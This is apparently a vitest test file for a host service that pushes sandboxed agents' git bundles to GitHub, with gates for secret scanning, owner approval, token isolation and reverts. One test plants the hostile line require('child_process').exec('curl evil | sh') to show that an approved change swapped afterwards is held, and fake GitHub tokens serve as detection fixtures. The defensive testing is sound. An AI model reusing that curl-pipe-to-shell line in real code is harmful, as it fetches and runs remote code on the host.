// The host's push (T68): the bundle round trip, what is refused, and what the git child is given.
import { existsSync, readFileSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { describe, expect, it } from "vitest";
import { MAX_BUNDLE_BYTES } from "../src/bundle.ts";
import { HostPushError } from "../src/host-push.ts";
import { WRITE_TOKEN } from "./fake-tokens.ts";
import { pushRig } from "./push-rig.ts";

const base = { repo: "acme/duet", defaultBranch: "main" };
/** Only the direct-mode gates push to the default branch. */
const main = { ...base, branch: "main", allowDefaultBranch: true };
const kindOf = async (p: Promise<unknown>) => {
  try {
    await p;
    return "pushed";
  } catch (e) {
    return e instanceof HostPushError ? e.kind : `other: ${String(e)}`;
  }
};

/** What the owner's OK on the card for this push would be: the host's own sha, hash of the diff, and the paths. */
async function cardFor(
  r: ReturnType<typeof pushRig>,
  sha: string,
  protect: { paths: string[]; hostExecuted?: boolean },
) {
  const err = await r.host.push({ ...main, sha, bundle: await r.bundle(sha), protect }).then(
    () => undefined,
    (e) => e,
  );
  if (!(err instanceof HostPushError) || err.kind !== "protected" || !err.approval) {
    throw new Error(`expected a card, got ${String(err)}`);
  }
  return { card: err.approval, approval: { sha, patchId: err.approval.patchId, paths: err.findings } };
}

describe("the host's push of a sandbox's bundle", () => {
  it("pushes the commit to GitHub, and writes the default branch's commits to the ledger first", async () => {
    const r = pushRig();
    const a = r.commit("a.txt", "a\n");
    const b = r.commit("b.txt", "b\n");
    const res = await r.host.push({
      ...main,
      sha: b,
      bundle: await r.bundle(b),
      ticket: "7",
    });
    expect(res).toEqual({ sha: b, pushed: true });
    expect(r.originGit("rev-parse", "refs/heads/main")).toBe(b);
    expect(r.ledgerLines().map((l) => [l.sha, l.tip, l.ticket, l.repo])).toEqual([
      [b, true, "7", "acme/duet"],
      [a, false, "7", "acme/duet"],
    ]);
    expect(r.ledgerLines()[0]?.parents).toEqual([a]);
    // Pushing it again is a no-op, and writes nothing.
    expect((await r.host.push({ ...main, sha: b, bundle: await r.bundle(b) })).pushed).toBe(false);
    expect(r.ledgerLines()).toHaveLength(2);
  });

  it("pushes a ticket's branch without touching the ledger, and a lease may replace it", async () => {
    const r = pushRig();
    const a = r.commit("a.txt", "a\n");
    await r.host.push({ ...base, branch: "inc/1-x", sha: a, bundle: await r.bundle(a) });
    expect(r.originGit("rev-parse", "refs/heads/inc/1-x")).toBe(a);
    expect(r.ledgerLines()).toEqual([]);
    // The branch is rebuilt: a different commit with the same parent, replaced under a lease.
    r.git(r.wt, "reset", "-q", "--hard", "HEAD~1");
    const a2 = r.commit("a.txt", "a2\n");
    expect(
      await kindOf(r.host.push({ ...base, branch: "inc/1-x", sha: a2, bundle: await r.bundle(a2) })),
    ).toBe("behind");
    expect(
      await kindOf(
        r.host.push({
          ...base,
          branch: "inc/1-x",
          sha: a2,
          bundle: await r.bundle(a2),
          lease: "0".repeat(40),
        }),
      ),
    ).toBe("behind");
    await r.host.push({ ...base, branch: "inc/1-x", sha: a2, bundle: await r.bundle(a2), lease: a });
    expect(r.originGit("rev-parse", "refs/heads/inc/1-x")).toBe(a2);
    // A lease of "" means the branch must not exist.
    expect(
      await kindOf(r.host.push({ ...base, branch: "inc/1-x", sha: a, bundle: await r.bundle(a), lease: "" })),
    ).toBe("behind");
  });

  it("never force-pushes the default branch", async () => {
    const r = pushRig();
    const a = r.commit("a.txt", "a\n");
    expect(await kindOf(r.host.push({ ...main, sha: a, bundle: await r.bundle(a), lease: "" }))).toBe(
      "refused",
    );
    expect(r.originGit("rev-parse", "refs/heads/main")).not.toBe(a);
  });

  it("pushes exactly the sha it was given, even if the sandbox's branch is moved to a child after the scan", async () => {
    const r = pushRig();
    const scanned = r.commit("good.txt", "fine\n");
    const wanted = await r.bundle(scanned);
    // After the scan the agent adds a child (with a credential) and the branch moves to it.
    const child = r.commit("evil.txt", 'export const t = "ghp_abcdefghijklmnopqrstuvwxyz0123456789";\n');
    expect(r.git(r.wt, "rev-parse", "HEAD")).toBe(child);
    // A bundle made now for the scanned sha holds the scanned sha, not the branch.
    const again = await r.bundle(scanned);
    await r.host.push({ ...main, sha: scanned, bundle: again });
    expect(r.originGit("rev-parse", "refs/heads/main")).toBe(scanned);
    expect(() => r.originGit("cat-file", "-e", `${child}^{commit}`)).toThrow();
    expect(wanted.length).toBeGreaterThan(0);
  });

  it("refuses a bundle whose tip is not the sha expected, or that holds extra refs, or is damaged", async () => {
    const r = pushRig();
    const a = r.commit("a.txt", "a\n");
    const b = r.commit("b.txt", "b\n");
    // The wrong tip: a bundle of b, offered as a.
    expect(await kindOf(r.host.push({ ...base, branch: "x", sha: a, bundle: await r.bundle(b) }))).toBe(
      "bundle",
    );
    // Extra commits on top of the expected one.
    expect(await kindOf(r.host.push({ ...base, branch: "x", sha: b, bundle: await r.bundle(a) }))).toBe(
      "bundle",
    );
    // Two heads.
    r.git(r.wt, "branch", "other", a);
    const two = join(r.root, "two.bundle");
    r.git(r.wt, "bundle", "create", two, "refs/heads/main", "refs/heads/other", "^refs/remotes/origin/main");
    expect(await kindOf(r.host.push({ ...base, branch: "x", sha: b, bundle: readFileSync(two) }))).toBe(
      "bundle",
    );
    // Corrupt, truncated, empty and not a bundle at all.
    const good = await r.bundle(b);
    const corrupt = Buffer.from(good);
    corrupt[corrupt.length - 40] = (corrupt[corrupt.length - 40] ?? 0) ^ 0xff;
    expect(await kindOf(r.host.push({ ...base, branch: "x", sha: b, bundle: corrupt }))).toBe("bundle");
    expect(
      await kindOf(r.host.push({ ...base, branch: "x", sha: b, bundle: good.subarray(0, good.length - 60) })),
    ).toBe("bundle");
    expect(await kindOf(r.host.push({ ...base, branch: "x", sha: b, bundle: Buffer.alloc(0) }))).toBe(
      "bundle",
    );
    expect(await kindOf(r.host.push({ ...base, branch: "x", sha: b, bundle: Buffer.from("hello") }))).toBe(
      "bundle",
    );
    expect(() => r.originGit("rev-parse", "refs/heads/x")).toThrow();
    // Nothing odd is left in the mirror.
    expect(r.ledgerLines()).toEqual([]);
  });

  it("asks for a full bundle when the sandbox built on commits the host doesn't have", async () => {
    const r = pushRig();
    const x = r.commit("x.txt", "x\n"); // never pushed
    const y = r.commit("y.txt", "y\n");
    r.git(r.wt, "update-ref", "refs/remotes/origin/unpushed", x);
    const thin = await r.bundle(y, ["refs/remotes/origin/unpushed"]);
    expect(await kindOf(r.host.push({ ...base, branch: "x", sha: y, bundle: thin }))).toBe("prerequisites");
    await r.host.push({ ...base, branch: "x", sha: y, bundle: await r.bundle(y, []) });
    expect(r.originGit("rev-parse", "refs/heads/x")).toBe(y);
  });

  it("refuses a push that holds a credential anywhere in its history, naming the commit and never the value", async () => {
    const r = pushRig();
    const token = "ghp_abcdefghijklmnopqrstuvwxyz0123456789";
    r.commit("config.ts", `export const t = "${token}";\n`, "add config");
    const tip = r.commit("config.ts", "export const t = process.env.T;\n", "remove it");
    const err = await r.host
      .push({ ...base, branch: "x", sha: tip, bundle: await r.bundle(tip) })
      .catch((e) => e);
    expect(err).toBeInstanceOf(HostPushError);
    expect(err.kind).toBe("secrets");
    expect(err.message).toMatch(/commit [0-9a-f]{7}/);
    expect(err.message).not.toContain(token);
    expect(() => r.originGit("rev-parse", "refs/heads/x")).toThrow();
    // And a file that usually holds secrets, by its name.
    const r2 = pushRig();
    const env = r2.commit(".env", "A=1\n");
    expect(await kindOf(r2.host.push({ ...base, branch: "x", sha: env, bundle: await r2.bundle(env) }))).toBe(
      "secrets",
    );
    expect(r2.ledgerLines()).toEqual([]);
  });

  it("caps the bundle's size and the commits it brings, and fails closed", async () => {
    const r = pushRig();
    const a = r.commit("a.txt", "a\n");
    const bundle = await r.bundle(a);
    const small = new (await import("../src/host-push.ts")).HostPusher({
      tokens: r.tokens,
      mirrors: join(r.root, "m2"),
      remote: () => r.origin,
      maxBundleBytes: 100,
    });
    expect(await kindOf(small.push({ ...base, branch: "x", sha: a, bundle }))).toBe("too-big");
    expect(MAX_BUNDLE_BYTES).toBeGreaterThan(1_000_000);
    // A remote that can't be read stops it before anything is pushed.
    const lost = new (await import("../src/host-push.ts")).HostPusher({
      tokens: r.tokens,
      mirrors: join(r.root, "m3"),
      remote: () => join(r.root, "nowhere.git"),
    });
    expect(await kindOf(lost.push({ ...base, branch: "x", sha: a, bundle }))).toBe("git");
  });

  it("gives the write token to one git child only, in its environment, with an empty home and no config", async () => {
    const r = pushRig();
    const a = r.commit("a.txt", "a\n");
    await r.host.push({ ...main, sha: a, bundle: await r.bundle(a) });
    const withToken = r.gitCalls.filter((c) =>
      JSON.stringify(c.env).includes(Buffer.from(`x-access-token:${WRITE_TOKEN}`).toString("base64")),
    );
    // The fetch of GitHub's branches and the push: nothing that reads the bundle or the history.
    expect(withToken.map((c) => c.args.find((x) => ["fetch", "push", "log", "bundle"].includes(x)))).toEqual([
      "fetch",
      "push",
    ]);
    for (const c of r.gitCalls) {
      expect(c.env.GIT_CONFIG_NOSYSTEM).toBe("1");
      expect(c.env.GIT_CONFIG_GLOBAL).toBe("/dev/null");
      expect(c.env.HOME).toBe(join(r.mirrors, ".home"));
      expect(c.args).toContain("core.hooksPath=/dev/null");
      expect(c.args).toContain("transfer.fsckObjects=true");
      expect(Object.keys(c.env).sort()).not.toContain("GH_TOKEN");
      expect(c.args.join(" ")).not.toContain(WRITE_TOKEN);
    }
    const push = withToken.find((c) => c.args.includes("push"));
    expect(push?.env.GIT_CONFIG_KEY_0).toBe("http.https://github.com/.extraheader");
    expect(push?.env.GIT_CONFIG_KEY_1).toBe("credential.helper");
    expect(push?.env.GIT_CONFIG_VALUE_1).toBe("");
    expect(existsSync(join(r.mirrors, ".home"))).toBe(true);
    expect(readFileSync(join(r.mirrors, "acme", "duet.git", "config"), "utf8")).not.toContain(WRITE_TOKEN);
  });

  it("takes a commit back out of main with a commit made on the host", async () => {
    const r = pushRig();
    const a = r.commit("a.txt", "a\n");
    await r.host.push({ ...main, sha: a, bundle: await r.bundle(a), ticket: "3" });
    const res = await r.host.revert({
      ...base,
      branch: "main",
      sha: a,
      author: { name: "Ada (i.inc)", email: "bot@example.invalid" },
      ticket: "3",
    });
    expect(res.pushed).toBe(true);
    expect(r.originGit("rev-parse", `${res.sha}^`)).toBe(a);
    expect(() => r.originGit("cat-file", "-e", `${res.sha}:a.txt`)).toThrow();
    expect(r.originGit("log", "-1", "--format=%an", "main")).toBe("Ada (i.inc)");
    expect(r.ledgerLines().map((l) => l.sha)).toContain(res.sha);
  });

  it("reports GitHub's branch tips as hints for thin bundles, and never throws", async () => {
    const r = pushRig();
    const tip = r.originGit("rev-parse", "refs/heads/main");
    expect(await r.host.tips("acme/duet", ["main", "nope"])).toEqual([tip]);
    writeFileSync(join(r.root, "x"), "");
    const lost = new (await import("../src/host-push.ts")).HostPusher({
      tokens: r.tokens,
      mirrors: join(r.root, "m4"),
      remote: () => join(r.root, "nowhere.git"),
    });
    expect(await lost.tips("acme/duet", ["main"])).toEqual([]);
  });
});

describe("what needs the owner, and what the ledger says about it", () => {
  const code = { paths: [] as string[], hostExecuted: true };

  it("holds a change to code the host could run until the owner approves, and not a document", async () => {
    const r = pushRig();
    const doc = r.commit("docs/guide.md", "words\n");
    expect(
      (await r.host.push({ ...main, sha: doc, bundle: await r.bundle(doc), protect: code })).pushed,
    ).toBe(true);
    const x = r.commit("apps/daemon/src/x.ts", "export {};\n");
    const err = await r.host
      .push({ ...main, sha: x, bundle: await r.bundle(x), protect: code })
      .catch((e) => e);
    expect(err).toMatchObject({ kind: "protected", findings: ["apps/daemon/src/x.ts"] });
    expect(r.originGit("rev-parse", "refs/heads/main")).toBe(doc);
    // Without hostExecuted, only the project's own protected paths hold.
    const plain = await r.host.push({
      ...main,
      sha: x,
      bundle: await r.bundle(x),
      protect: { paths: ["docs/"] },
    });
    expect(plain.pushed).toBe(true);
  });

  it("records the owner's approval, the commit and the hash of the diff in the ledger, for the deployer to look for", async () => {
    const r = pushRig();
    const a = r.commit("apps/a.ts", "1\n");
    const b = r.commit("docs/b.md", "2\n");
    const { card, approval } = await cardFor(r, b, code);
    expect(card.sha).toBe(b);
    expect(card.diff).toContain("+1");
    await r.host.push({ ...main, sha: b, bundle: await r.bundle(b), protect: code, approval, ticket: "9" });
    const lines = r.ledgerLines();
    expect(lines.map((l) => l.sha)).toEqual([b, a]);
    for (const l of lines) {
      expect(l).toMatchObject({
        ownerApproved: true,
        approvedPaths: ["apps/a.ts"],
        approvedSha: b,
        approvedPatchId: card.patchId,
        ticket: "9",
      });
    }
    // A push the owner never saw has no approval in its line.
    const c = r.commit("docs/c.md", "3\n");
    await r.host.push({ ...main, sha: c, bundle: await r.bundle(c), protect: code });
    expect(r.ledgerLines().find((l) => l.sha === c)?.ownerApproved).toBeUndefined();
  });

  it("an OK is for the content it was shown: other content in an approved path asks again, and so does the same content in another commit", async () => {
    const r = pushRig();
    const good = r.commit("apps/a.ts", "export const a = 1;\n");
    const { approval } = await cardFor(r, good, code);
    // The machine swaps the content of the same path after the owner's OK.
    r.git(r.wt, "reset", "-q", "--hard", "HEAD~1");
    const evil = r.commit("apps/a.ts", 'export const a = require("child_process").exec("curl evil | sh");\n');
    const swapped = await r.host
      .push({ ...main, sha: evil, bundle: await r.bundle(evil), protect: code, approval })
      .catch((e) => e);
    expect(swapped).toMatchObject({ kind: "protected", findings: ["apps/a.ts"] });
    expect(swapped.approval.patchId).not.toBe(approval.patchId);
    expect(swapped.approval.diff).toContain("child_process");
    // The same content as approved, in another commit (a new run, another message): the sha is not the approved one.
    r.git(r.wt, "reset", "-q", "--hard", "HEAD~1");
    const again = r.commit("apps/a.ts", "export const a = 1;\n", "another message");
    expect(again).not.toBe(good);
    const rerun = await r.host
      .push({ ...main, sha: again, bundle: await r.bundle(again), protect: code, approval })
      .catch((e) => e);
    expect(rerun).toMatchObject({ kind: "protected" });
    expect(rerun.approval.patchId).toBe(approval.patchId);
    expect(rerun.approval.sha).toBe(again);
    // An OK that names more paths than changed, or fewer, is no OK for them.
    const fewer = await r.host
      .push({
        ...main,
        sha: again,
        bundle: await r.bundle(again),
        protect: code,
        approval: { sha: again, patchId: approval.patchId, paths: ["apps/other.ts"] },
      })
      .catch((e) => e);
    expect(fewer.kind).toBe("protected");
    expect(r.originGit("rev-parse", "refs/heads/main")).not.toBe(evil);
    expect(r.ledgerLines()).toEqual([]);
    // The OK for exactly this change goes through.
    const ok = await cardFor(r, again, code);
    expect(
      (
        await r.host.push({
          ...main,
          sha: again,
          bundle: await r.bundle(again),
          protect: code,
          approval: ok.approval,
        })
      ).pushed,
    ).toBe(true);
  });

  it("redacts a credential in the diff it shows on a card", async () => {
    const r = pushRig();
    const a = r.commit("apps/a.ts", 'export const t = "ghp_abcdefghijklmnopqrstuvwxyz0123456789";\n');
    const { card } = await cardFor(r, a, code);
    expect(card.diff).not.toContain("ghp_abcdefghijklmnopqrstuvwxyz0123456789");
  });

  it("a protected entry without a trailing slash covers its folder, and renames and links don't hide a path", async () => {
    const r = pushRig({ files: { "tools/old.sh": "x\n" } });
    r.git(r.wt, "mv", "tools/old.sh", "elsewhere.sh");
    r.git(r.wt, "commit", "-qm", "moves it out of tools");
    const moved = r.git(r.wt, "rev-parse", "HEAD");
    const held = await r.host
      .push({ ...main, sha: moved, bundle: await r.bundle(moved), protect: { paths: ["tools"] } })
      .catch((e) => e);
    expect(held).toMatchObject({
      kind: "protected",
      findings: ["elsewhere.sh", "tools/old.sh"].filter((f) => f.startsWith("tools")),
    });
  });

  it("writes a commit to the ledger even when it is already on another branch of GitHub", async () => {
    const r = pushRig();
    const a = r.commit("a.txt", "a\n");
    await r.host.push({ ...base, branch: "conv/1", sha: a, bundle: await r.bundle(a) });
    expect(r.ledgerLines()).toEqual([]);
    // The same commit, to main: it is on GitHub already (another branch), and still it is what put it on main.
    await r.host.push({ ...main, sha: a, bundle: await r.bundle(a), ticket: "4" });
    expect(r.ledgerLines().map((l) => [l.sha, l.ticket])).toEqual([[a, "4"]]);
    expect(r.originGit("rev-parse", "refs/heads/main")).toBe(a);
  });

  it("refuses a caller that is not the direct-mode gates when it asks for the default branch", async () => {
    const r = pushRig();
    const a = r.commit("a.txt", "a\n");
    expect(await kindOf(r.host.push({ ...base, branch: "main", sha: a, bundle: await r.bundle(a) }))).toBe(
      "refused",
    );
    expect(r.originGit("rev-parse", "refs/heads/main")).not.toBe(a);
  });

  it("lets the owner say a finding is not a secret, and says so in the ledger; a change too big to read is never waved through", async () => {
    const r = pushRig();
    const a = r.commit("fixtures.ts", 'export const fake = "ghp_abcdefghijklmnopqrstuvwxyz0123456789";\n');
    const bundle = await r.bundle(a);
    const err = await r.host.push({ ...main, sha: a, bundle }).catch((e) => e);
    expect(err).toMatchObject({ kind: "secrets" });
    expect(err.findings).toEqual([expect.stringMatching(/^commit [0-9a-f]{7}$/)]);
    expect(r.originGit("rev-parse", "refs/heads/main")).not.toBe(a);
    const ok = await r.host.push({ ...main, sha: a, bundle, overrideSecrets: true });
    expect(ok.pushed).toBe(true);
    expect(r.ledgerLines()[0]).toMatchObject({ sha: a, ownerApproved: true, secretsOverridden: true });
  });

  it("marks a revert the host made, which the deployer accepts without the owner", async () => {
    const r = pushRig();
    const a = r.commit("apps/a.ts", "1\n");
    await r.host.push({ ...main, sha: a, bundle: await r.bundle(a) });
    const res = await r.host.revert({
      ...base,
      branch: "main",
      sha: a,
      author: { name: "Ada (i.inc)", email: "bot@example.invalid" },
    });
    expect(r.ledgerLines().find((l) => l.sha === res.sha)).toMatchObject({ hostRevert: a });
  });

  it("ignores replace refs: the host's git never reads them", async () => {
    const r = pushRig();
    const a = r.commit("a.txt", "a\n");
    await r.host.push({ ...base, branch: "x", sha: a, bundle: await r.bundle(a) });
    for (const c of r.gitCalls) expect(c.env.GIT_NO_REPLACE_OBJECTS).toBe("1");
  });

  it("tells whether a commit is on GitHub's branch from its own mirror, and holds only the paths not on the card", async () => {
    const r = pushRig();
    const a = r.commit("apps/a.ts", "1\n");
    const b = r.commit("tools/b.sh", "2\n");
    const req = { repo: "acme/duet", branch: "main" };
    expect(await r.host.landed({ ...req, sha: a })).toBe(false); // the mirror has never seen it
    // The owner OKed a change to apps/a.ts only (a card for the earlier commit): tools/b.sh is still held.
    const protect = { paths: ["tools/"], hostExecuted: true };
    const { approval } = await cardFor(r, b, protect);
    expect(approval.paths).toEqual(["apps/a.ts", "tools/b.sh"]);
    const held = await r.host
      .push({
        ...main,
        sha: b,
        bundle: await r.bundle(b),
        protect,
        approval: { ...approval, paths: ["apps/a.ts"] },
      })
      .catch((e) => e);
    expect(held).toMatchObject({ kind: "protected" });
    expect(await r.host.landed({ ...req, sha: a })).toBe(false);
    await r.host.push({ ...main, sha: b, bundle: await r.bundle(b), protect, approval });
    expect(await r.host.landed({ ...req, sha: a })).toBe(true);
    expect(await r.host.landed({ ...req, sha: b })).toBe(true);
    expect(await r.host.landed({ ...req, sha: "f".repeat(40) })).toBe(false);
    expect(await r.host.landed({ repo: "acme/duet", branch: "main", sha: "nope" })).toBeNull();
    expect(r.ledgerLines()[0]).toMatchObject({
      ownerApproved: true,
      approvedPaths: ["apps/a.ts", "tools/b.sh"],
      approvedSha: b,
    });
  });

  it("reverts only a commit this daemon pushed to the branch for this ticket, that is on GitHub's branch", async () => {
    const author = { name: "Ada (i.inc)", email: "bot@example.invalid" };
    // A commit on a conversation's branch, never on main: the revert of a payload-deleting commit would put the payload on main.
    const r = pushRig({ files: { "payload.sh": "evil\n" } });
    r.git(r.wt, "rm", "-q", "payload.sh");
    r.git(r.wt, "commit", "-qm", "delete the payload");
    const deleter = r.git(r.wt, "rev-parse", "HEAD");
    await r.host.push({
      ...base,
      branch: "conv/1",
      sha: deleter,
      bundle: await r.bundle(deleter),
      ticket: "3",
    });
    const before = r.originGit("rev-parse", "refs/heads/main");
    const err = await r.host
      .revert({ ...base, branch: "main", sha: deleter, author, ticket: "3" })
      .catch((e) => e);
    expect(err).toMatchObject({ kind: "refused" });
    expect(err.message).toContain("not a commit this daemon pushed");
    expect(r.originGit("rev-parse", "refs/heads/main")).toBe(before);
    // A commit the daemon did push to main, but for another ticket.
    const a = r.commit("a.txt", "a\n");
    await r.host.push({ ...main, sha: a, bundle: await r.bundle(a), ticket: "4" });
    expect(
      await r.host.revert({ ...base, branch: "main", sha: a, author, ticket: "3" }).catch((e) => e),
    ).toMatchObject({
      kind: "refused",
    });
    // A ledger line for a commit that never reached main (its push was rejected): not on the branch.
    const ghost = r.commit("ghost.txt", "g\n");
    await r.host.push({ ...base, branch: "conv/2", sha: ghost, bundle: await r.bundle(ghost), ticket: "5" });
    writeFileSync(
      r.ledger as string,
      `${readFileSync(r.ledger as string, "utf8")}${JSON.stringify({ sha: ghost, repo: "acme/duet", branch: "main", ticket: "5", at: 1, parents: [], tip: true })}\n`,
    );
    const notThere = await r.host
      .revert({ ...base, branch: "main", sha: ghost, author, ticket: "5" })
      .catch((e) => e);
    expect(notThere).toMatchObject({ kind: "refused" });
    expect(notThere.message).toContain("is not on main");
    // The one that is ledgered, for this ticket, and on main: reverted.
    expect((await r.host.revert({ ...base, branch: "main", sha: a, author, ticket: "4" })).pushed).toBe(true);
  });
});
